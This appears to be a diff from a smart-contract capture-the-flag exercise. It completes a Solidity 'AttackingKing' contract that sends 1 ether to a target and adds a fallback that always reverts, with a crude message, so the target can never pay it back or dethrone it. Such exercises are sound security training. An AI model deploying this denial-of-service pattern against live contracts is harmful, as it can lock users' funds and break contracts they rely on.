@@ -10,7 +10,14 @@ contract AttackingKing {
         contractAddress = _contractAddress;
     }
 
-    function hackContract() external {
-        // Code me!
+    function hackContract() public payable {
+         (bool result,bytes memory data ) = contractAddress.call{value: 1000000000000000000}("");
+        if (!result) revert();
+        
     }
+
+fallback () external payable {
+    revert("l'etat, c'est moi bitch");
+}
+
 }
